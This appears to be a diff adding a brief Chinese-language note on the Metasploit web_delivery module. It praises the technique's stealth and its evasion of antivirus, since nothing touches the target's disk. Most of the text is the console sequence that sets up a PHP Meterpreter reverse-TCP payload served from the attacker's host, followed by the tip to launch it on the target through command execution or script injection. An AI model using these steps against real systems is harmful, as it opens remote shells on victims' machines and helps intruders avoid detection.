@@ -1,0 +1,19 @@
+msf模块-exploit/multi/script/web_delivery
+
+web递交脚本的主要优势是隐藏。服务器和负载都驻留在你的设备上，
+因此在执行攻击时，不会将任何内容写入目标的磁盘，
+从而降低了触发防病毒应用程序和其他防御的可能性。
+
+这个方法需要注意的一个地方是，它需要一种在目标设备上执行命令的方法来启动脚本。
+
+use exploit/multi/script/web_delivery
+show options
+set payload php/meterpreter/reverse_tcp
+set SRVHOST <your ip>
+set LHOST <your ip>
+set URIPATH /
+show targets
+set target 1
+exploit
+
+生成的php脚本能够在目标机上成功运行就行（命令执行、脚本注入）
